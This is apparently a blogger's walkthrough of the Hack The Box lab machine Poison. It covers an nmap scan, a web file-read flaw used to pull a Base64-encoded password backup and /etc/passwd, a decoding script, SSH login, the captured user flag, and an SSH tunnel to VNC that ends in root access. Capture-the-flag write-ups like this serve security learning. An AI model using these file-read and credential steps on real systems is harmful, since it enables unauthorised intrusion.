This is my write-up/walkthrough for [the Hack The Box machine, Poison](https://app.hackthebox.com/machines/Poison). It's a FreeBSD machine, rated "Medium", with 10.10.10.84 as its IP address.

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-01.JPG "Poison Info Card")

I started with an nmap scan—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ sudo nmap -sC -sV -A 10.10.10.84
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-27 07:08 EDT
Nmap scan report for 10.10.10.84
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/27%OT=22%CT=1%CU=42789%PV=Y%DS=2%DC=T%G=Y%TM=6240478
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=RI%TS=22)O
OS:PS(O1=M54BNW6ST11%O2=M54BNW6ST11%O3=M280NW6NNT11%O4=M54BNW6ST11%O5=M218N
OS:W6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)E
OS:CN(R=Y%DF=Y%T=40%W=FFFF%O=M54BNW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%R
OS:D=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   181.57 ms 10.10.16.1
2   181.65 ms 10.10.10.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 473.34 seconds
```

—that told me we've got port 22 (SSH) and port 80 (HTTP) to work with. I didn't think SSH would be open to all, so I decided to check out that HTTP.

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-02.JPG "Welcome screen")

It was now time to try out all the files mentioned there. The most interesting of them was `listfiles.php`, which got me the following:

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-03.JPG "File list result")

I immediately jumped on `pwdbackup.txt` and submitted that as the scriptname for the site.

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-04.JPG "pwdbackup")

The "=" at the end there gave away that this is Base64 encoded, so it might be possible to decode this, but perhaps not using one of the many online decoding tools readily available. I needed another way to figure out get what I wanted. A quick google search led me [here](https://www.sentinelone.com/blog/guide-encode-decoded-base64/) and after a little trial and error, I was able to update the script to suit my need—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ cat Base64Decoder.py    
import base64

string = 'Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo='

for i in range(13):
    string = base64.b64decode(string)

print(string)
```
—and get the decoded password.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ python3 Base64Decoder.py
b'Charix!2#4%6&8(0'
```

I now found myself in a peculiar situation – I knew the password (to... something?) but not the username to run that against.

Since I was able to run `pwdbackup.txt` on that site – a file not mentioned on the example list there – I figured I'll try running `/etc/passwd` as well and see if that gets me somewhere. Suprisingly, it did!

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-05.JPG "/etc/passwd")

I read the file wrong though, as I kept trying Charlie:Charix!2#4%6&8(0 on the only other open port I had to work with.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ssh Charlie@10.10.10.84         
The authenticity of host '10.10.10.84 (10.10.10.84)' can't be established.
ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.84' (ED25519) to the list of known hosts.

(Charlie@10.10.10.84) Password for Charlie@Poison:
(Charlie@10.10.10.84) Password for Charlie@Poison:
(Charlie@10.10.10.84) Password for Charlie@Poison:

```

A second look at the file suggested that it is, perhaps, "charix", and not "Charlie".

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ssh charix@10.10.10.84                                                                                                                                                                                  130 ⨯
(charix@10.10.10.84) Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
If you are in the C shell and have just installed a new program, you won't
be able to run it unless you first type "rehash".
                -- Dru <genesis@istar.ca>
charix@Poison:~ %
```

A quick look around got me the user flag—

```
charix@Poison:~ % id
uid=1001(charix) gid=1001(charix) groups=1001(charix)
charix@Poison:~ % pwd
/home/charix
charix@Poison:~ % ls
secret.zip      user.txt
charix@Poison:~ % cat user.txt 
eaacdfb2d141b72a589233063604209c
charix@Poison:~ %
```

—though the only possible lead I had so far to the root flag wasn't fruitful.

```
charix@Poison:~ % unzip secret.zip 
Archive:  secret.zip
 extracting: secret |
unzip: Passphrase required for this entry
charix@Poison:~ %
```

It was time to look around and see if I can get anything interesting. There was nothing in the directories, so I started looking at the running processes, open ports, etc. – anything, honestly.

```
charix@Poison:~ % ps -aux
USER   PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
root    11 100.0  0.0      0    16  -  RL   13:03   57:00.54 [idle]
root     0   0.0  0.0      0   160  -  DLs  13:03    0:00.01 [kernel]
root     1   0.0  0.1   5408  1040  -  ILs  13:03    0:00.00 /sbin/init --
root     2   0.0  0.0      0    16  -  DL   13:03    0:00.00 [crypto]
root     3   0.0  0.0      0    16  -  DL   13:03    0:00.00 [crypto returns]
root     4   0.0  0.0      0    32  -  DL   13:03    0:00.06 [cam]
root     5   0.0  0.0      0    16  -  DL   13:03    0:00.00 [mpt_recovery0]
root     6   0.0  0.0      0    16  -  DL   13:03    0:00.00 [sctp_iterator]
root     7   0.0  0.0      0    16  -  DL   13:03    0:03.01 [rand_harvestq]
root     8   0.0  0.0      0    16  -  DL   13:03    0:00.00 [soaiod1]
root     9   0.0  0.0      0    16  -  DL   13:03    0:00.00 [soaiod2]
root    10   0.0  0.0      0    16  -  DL   13:03    0:00.00 [audit]
root    12   0.0  0.1      0   736  -  WL   13:03    0:02.03 [intr]
root    13   0.0  0.0      0    48  -  DL   13:03    0:00.00 [geom]
root    14   0.0  0.0      0   160  -  DL   13:03    0:00.20 [usb]
root    15   0.0  0.0      0    16  -  DL   13:03    0:00.00 [soaiod3]
root    16   0.0  0.0      0    16  -  DL   13:03    0:00.00 [soaiod4]
root    17   0.0  0.0      0    48  -  DL   13:03    0:00.08 [pagedaemon]
root    18   0.0  0.0      0    16  -  DL   13:03    0:00.00 [vmdaemon]
root    19   0.0  0.0      0    16  -  DL   13:03    0:00.00 [pagezero]
root    20   0.0  0.0      0    32  -  DL   13:03    0:00.07 [bufdaemon]
root    21   0.0  0.0      0    16  -  DL   13:03    0:00.01 [bufspacedaemon]
root    22   0.0  0.0      0    16  -  DL   13:03    0:00.07 [syncer]
root    23   0.0  0.0      0    16  -  DL   13:03    0:00.01 [vnlru]
root   319   0.0  0.5   9560  5052  -  Ss   13:03    0:00.22 /sbin/devd
root   390   0.0  0.2  10500  2448  -  Ss   13:03    0:00.09 /usr/sbin/syslogd -s
root   543   0.0  0.5  56320  5396  -  S    13:03    0:02.61 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugins/vmsvc
root   620   0.0  0.7  57812  7052  -  Is   13:03    0:00.01 /usr/sbin/sshd
root   625   0.0  1.1  99172 11516  -  Ss   13:04    0:00.15 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    637   0.0  1.2 101220 12020  -  I    13:05    0:00.19 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    640   0.0  1.2 101220 11856  -  I    13:05    0:00.25 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    641   0.0  1.2 101220 11856  -  I    13:05    0:00.22 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   642   0.0  0.6  20636  6140  -  Ss   13:05    0:00.07 sendmail: accepting connections (sendmail)
smmsp  645   0.0  0.6  20636  5968  -  Is   13:06    0:00.00 sendmail: Queue runner@00:30:00 for /var/spool/clientmqueue (sendmail)
root   649   0.0  0.2  12592  2436  -  Is   13:06    0:00.01 /usr/sbin/cron -s
www    719   0.0  1.2 101220 11856  -  I    13:16    0:00.20 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    732   0.0  1.2 101220 12276  -  I    13:16    0:00.18 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    739   0.0  1.2 101220 11916  -  I    13:16    0:00.19 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    740   0.0  1.2 101220 11748  -  S    13:16    0:00.20 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    742   0.0  1.2 101220 11732  -  I    13:16    0:00.22 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    743   0.0  1.2 101220 12076  -  I    13:16    0:00.19 /usr/local/sbin/httpd -DNOHTTPACCEPT
www    748   0.0  1.2 101220 11748  -  I    13:17    0:00.19 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   794   0.0  0.8  85228  7840  -  Is   13:53    0:00.02 sshd: charix [priv] (sshd)
charix 797   0.0  0.8  85228  7860  -  S    13:53    0:00.02 sshd: charix@pts/1 (sshd)
root   529   0.0  0.9  23620  8872 v0- I    13:03    0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc
root   540   0.0  0.7  67220  7064 v0- I    13:03    0:00.03 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   541   0.0  0.5  37620  5312 v0- I    13:03    0:00.01 twm
root   696   0.0  0.2  10484  2076 v0  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv0
root   697   0.0  0.2  10484  2076 v1  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv1
root   698   0.0  0.2  10484  2076 v2  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv2
root   699   0.0  0.2  10484  2076 v3  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv3
root   700   0.0  0.2  10484  2076 v4  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv4
root   701   0.0  0.2  10484  2076 v5  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv5
root   702   0.0  0.2  10484  2076 v6  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv6
root   703   0.0  0.2  10484  2076 v7  Is+  13:06    0:00.00 /usr/libexec/getty Pc ttyv7
root   558   0.0  0.4  19660  3616  0  Is+  13:03    0:00.01 -csh (csh)
charix 798   0.0  0.4  19660  3624  1  Ss   13:53    0:00.02 -csh (csh)
charix 838   0.0  0.3  21208  2656  1  R+   14:00    0:00.00 ps -aux
charix@Poison:~ %
```

That—

```
root   529   0.0  0.9  23620  8872 v0- I    13:03    0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc
```

—stood out to me. I looked it up online and found out about [TightVNC](https://www.tightvnc.net/) – "a free remote desktop application. With TightVNC, you can see the desktop of a remote machine and control it with your local mouse and keyboard, just like you would do it sitting in the front of that computer."

Meanwhile, `netstat` got me the following:

```
charix@Poison:~ % netstat -an
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.10.10.84.22         10.10.16.21.36812      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*                    
udp6       0      0 *.514                  *.*                    
Active UNIX domain sockets
Address          Type   Recv-Q Send-Q            Inode             Conn             Refs          Nextref Addr
fffff80003b39e10 stream      0      0                0 fffff80003b39d20                0                0
fffff80003b39d20 stream      0      0                0 fffff80003b39e10                0                0
fffff80003b3a2d0 stream      0      0                0 fffff80003b3a3c0                0                0 /tmp/.X11-unix/X1
fffff80003b3a3c0 stream      0      0                0 fffff80003b3a2d0                0                0
fffff80003b3a5a0 stream      0      0                0 fffff80003b3a4b0                0                0 /tmp/.X11-unix/X1
fffff80003b3a4b0 stream      0      0                0 fffff80003b3a5a0                0                0
fffff80003b3a690 stream      0      0 fffff80003b321d8                0                0                0 /tmp/.X11-unix/X1
fffff80003b3ab40 stream      0      0 fffff80003ae6938                0                0                0 /var/run/devd.pipe
fffff80003b3a0f0 dgram       0      0                0 fffff80003b3a960                0                0
fffff80003b3a1e0 dgram       0      0                0 fffff80003b3a870                0 fffff80003b3a780
fffff80003b3a780 dgram       0      0                0 fffff80003b3a870                0                0
fffff80003b3a870 dgram       0      0 fffff80003c56000                0 fffff80003b3a1e0                0 /var/run/logpriv
fffff80003b3a960 dgram       0      0 fffff80003c561d8                0 fffff80003b3a0f0                0 /var/run/log
fffff80003b3aa50 seqpac      0      0 fffff80003ae6760                0                0                0 /var/run/devd.seqpacket.pipe
charix@Poison:~ %
```

So, in addition to port 22 (SSH) and port 80 (HTTP), I now had port 25 (SMTP), and port 5801 and 5901 – both generally used for VNC – to work with. I had no idea how to exploit them, though. Hitting another brick wall, I literally googled "ssh smtp http vnc" and landed [here](https://www.techrepublic.com/article/how-to-connect-to-vnc-using-ssh/). Apparently, you can tunnel VNC through SSH.

I followed that article to set up the tunneling on one terminal—

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84                                                                                                                                                                                     130 ⨯
(charix@10.10.10.84) Password for charix@Poison:
Last login: Sun Mar 27 13:53:50 2022 from 10.10.16.21
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
If you'd like to keep track of applications in the FreeBSD ports tree, take a
look at FreshPorts;

        http://www.freshports.org/
charix@Poison:~ % 
```

—while I used [xtightvncviewer](https://www.kali.org/tools/tightvnc/#xtightvncviewer) on another to connect to the target machine. It did take a while to figure out how, though.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ xtightvncviewer 127.0.0.1:5801                                                                                                                                                                            1 ⨯
xtightvncviewer: ConnectToTcpAddr: connect: Connection refused
Unable to connect to VNC server
                                                                                                                                                                                                                  
┌──(thatvirdiguy㉿kali)-[~]
└─$ xtightvncviewer 127.0.0.1:5901                                                                                                                                                                            1 ⨯
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication failed

┌──(kali㉿kali)-[~]
└─$ xtightvncviewer -h                                                                                                                                                                                        1 ⨯
TightVNC Viewer version 1.3.10

Usage: xtightvncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       xtightvncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       xtightvncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       xtightvncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
        -encodings <ENCODING-LIST> (e.g. "tight copyrect")
        -bgr233
        -owncmap
        -truecolour
        -depth <DEPTH>
        -compresslevel <COMPRESS-VALUE> (0..9: 0-fast, 9-best)
        -quality <JPEG-QUALITY-VALUE> (0..9: 0-low, 9-high)
        -nojpeg
        -nocursorshape
        -x11cursor
        -autopass

Option names may be abbreviated, e.g. -bgr instead of -bgr233.
See the manual page for more information.

```

It needed a password file to authenticate the connection. I wish I could say I realised immediately that I could use the contents of `secret.zip` here, but that wasn't the case. After racking my brain for several hours, I finally got the root flag.

```
┌──(thatvirdiguy㉿kali)-[~]
└─$ xtightvncviewer -passwd secret 127.0.0.1:5901                                                                                                                                                             1 ⨯
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding


```

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-06.JPG "VNC")

![Alt text](/images/poison/2022-03-27-hack-the-box-poison-07.JPG "root")

